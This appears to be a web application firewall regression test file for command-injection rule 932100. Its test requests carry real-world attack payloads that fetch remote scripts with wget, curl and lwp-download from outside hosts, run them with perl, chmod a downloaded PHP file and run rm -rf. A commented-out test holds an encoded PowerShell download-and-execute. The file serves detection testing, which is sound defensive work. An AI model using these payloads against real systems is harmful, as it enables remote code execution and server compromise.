---
  meta:
    author: csanders-git
    description: None
    enabled: true
    name: 932100.yaml
  tests:
  -
    test_title: 932100-1
    desc: System Command Injection (932100) from old modsec regressions
    stages:
    -
      stage:
        input:
          dest_addr: 127.0.0.1
          headers:
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
            Accept-Encoding: gzip,deflate
            Accept-Language: en-us,en;q=0.5
            Host: localhost
            Keep-Alive: '300'
            Proxy-Connection: keep-alive
            User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
          method: GET
          port: 80
          uri: /?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
          version: HTTP/1.0
        output:
          log_contains: id "932100"
  -
    test_title: 932100-2
    desc: System Command Injection (932100) from old modsec regressions
    stages:
    -
      stage:
        input:
          dest_addr: 127.0.0.1
          headers:
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
            Accept-Encoding: gzip,deflate
            Accept-Language: en-us,en;q=0.5
            Host: localhost
            Keep-Alive: '300'
            Proxy-Connection: keep-alive
            User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
          method: GET
          port: 80
          uri: /?foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
          version: HTTP/1.0
        output:
          log_contains: id "932100"
  # - 
  #   test_title: 932100-3
  #   desc: CSV Injection Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
  #   stages:
  #   - stage:
  #       input:
  #         data: !!binary |
  #           ZD0xOzI7Mzs0OzVcbjE7QFNVTSgxKzEpKmNtZHwnIHBvd2Vyc2hlbGwgSUVYKHdnZXQgMHIucGUv
  #           cCknXCFBMDsz
  #         dest_addr: localhost
  #         headers:
  #           Accept: '*/*'
  #           Content-Type: application/x-www-form-urlencoded
  #           Host: localhost
  #           User-Agent: curl/7.43.0
  #         method: POST
  #         port: 80
  #         uri: /index.html
  #         version: HTTP/1.1
  #       output:
  #         log_contains: id "932100"
